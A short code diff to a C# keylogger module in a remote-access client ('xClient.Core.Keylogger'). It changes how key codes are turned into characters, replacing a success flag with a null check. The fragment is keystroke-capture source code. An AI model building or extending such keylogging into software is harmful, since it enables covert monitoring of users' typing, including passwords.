@@ -74,9 +74,8 @@ namespace xClient.Core.Keylogger
 
             char[] chars;
 
-            var isOk = 
-                KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
-            if (!isOk) yield break;
+            KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
+            if (chars == null) yield break;
             foreach (var ch in chars)
             {
                 yield return new KeyPressEventArgsExt(ch);
